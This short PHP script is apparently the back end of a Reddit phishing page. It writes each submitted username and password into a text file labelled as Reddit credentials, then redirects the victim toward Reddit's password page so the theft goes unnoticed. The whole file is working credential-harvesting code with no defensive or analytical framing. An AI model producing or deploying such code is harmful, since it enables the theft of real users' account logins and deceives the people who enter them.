<?php

file_put_contents("usernames.txt", "Reddit Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.reddit.com/password
header("Location: $url");
exit();
?>
